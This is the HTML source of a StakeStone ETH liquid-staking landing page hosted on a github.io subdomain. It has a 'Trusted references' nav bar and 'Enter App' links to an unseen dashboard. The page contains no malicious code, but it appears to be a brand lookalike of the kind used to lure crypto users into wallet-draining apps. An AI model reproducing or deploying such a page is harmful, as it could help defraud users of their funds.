<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>StakeStone</title>
  <meta name="description" content="StakeStone turns staked ETH into an omnichain liquid staking token from your own wallet.">
  <link rel="canonical" href="https://stakestone-app.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F2EA">
  <meta property="og:type" content="website">
  <meta property="og:title" content="StakeStone">
  <meta property="og:description" content="StakeStone turns staked ETH into an omnichain liquid staking token from your own wallet.">
  <meta property="og:url" content="https://stakestone-app.github.io/">
  <meta property="og:image" content="https://stakestone-app.github.io/favicon.png">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="StakeStone">
  <meta name="twitter:description" content="StakeStone turns staked ETH into an omnichain liquid staking token from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://stakestone-app.github.io/#website",
        "url": "https://stakestone-app.github.io/",
        "name": "StakeStone",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://stakestone-app.github.io/#organization",
        "name": "StakeStone",
        "url": "https://stakestone-app.github.io/",
        "sameAs": [
          "https://stakestone.io/"
        ]
      },
      {
        "@type": "WebApplication",
        "@id": "https://stakestone-app.github.io/#app",
        "name": "StakeStone",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://stakestone-app.github.io/"
      }
    ]
  }
  </script>

  <link rel="prefetch" href="dashboard/">
  <link rel="prerender" href="dashboard/">
</head>
<body>
  <header class="topbar">
    <a class="brand" href="#" aria-label="StakeStone home">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>StakeStone</span>
    </a>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://etherscan.io/token/0x1D88713b483A8E45cfF0e5CD7c2e15E5Fab4534d" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
      <a href="https://ethereum.org/staking/" target="_blank" rel="nofollow noopener noreferrer">Ethereum staking</a>
      <a href="https://www.coingecko.com/en/coins/stakestone" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
    </nav>
    <span class="sp"></span>
    <a class="ghost" href="dashboard/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-label="StakeStone entry">
      <h1>StakeStone</h1>
      <p class="sub"><strong>StakeStone</strong> turns staked ETH into an omnichain liquid staking token from your own wallet.</p>
    </section>

    <section class="card" aria-label="Deposit route">
      <div class="card-head">
        <span class="card-title">Deposit</span>
        <span class="badge">Omnichain liquid staking</span>
      </div>
      <div class="route">
        <div class="leg">
          <span class="lbl">From</span>
          <span class="chip">
            <img class="ic" src="eth.png" width="28" height="28" alt="ETH">
            <span class="token">ETH</span>
          </span>
        </div>
        <button class="dir" type="button" data-dir aria-label="Switch deposit direction"><span aria-hidden="true">&#8594;</span></button>
        <div class="leg">
          <span class="lbl">To</span>
          <span class="chip">
            <img class="ic" src="stone.png" width="28" height="28" alt="STONE">
            <span class="token">STONE</span>
          </span>
        </div>
      </div>
      <a class="act" href="dashboard/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
    </section>
  </main>

  <footer class="foot">StakeStone &mdash; 2026</footer>

  <script>
  (function(){
    "use strict";
    var button = document.querySelector("[data-dir]");
    if (!button) return;
    button.addEventListener("click", function(){
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length < 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  })();
  </script>
</body>
</html>
